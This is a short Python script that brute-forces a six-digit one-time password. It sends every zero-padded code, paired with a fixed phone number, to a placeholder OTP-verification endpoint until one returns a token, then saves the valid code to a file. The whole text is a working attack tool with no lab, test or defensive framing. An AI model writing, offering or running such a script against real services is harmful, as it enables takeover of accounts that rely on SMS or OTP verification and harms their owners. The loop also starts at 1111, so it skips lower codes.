import requests

# ===== CONFIGURATION =====
OTP_URL = "https://example.com/api/verify-otp"
PHONE_NUMBER = "1234567890"
OUTPUT_FILE = "valid_otp.txt"

HEADERS = {
    "Content-Type": "application/json"
}

# =========================

for otp in range(1111, 1000000):
    payload = {
        "phone": PHONE_NUMBER,
        "otp": str(otp).zfill(6)
    }
    
    resp = requests.post(OTP_URL, json=payload, headers=HEADERS)
    
    if resp.status_code == 200 and resp.json().get("token"):
        print(f"✅ VALID OTP: {str(otp).zfill(6)}")
        with open(OUTPUT_FILE, "a") as out:
            out.write(f"{PHONE_NUMBER}:{str(otp).zfill(6)}\n")
        break
    else:
        print(f"❌ Trying: {str(otp).zfill(6)}")
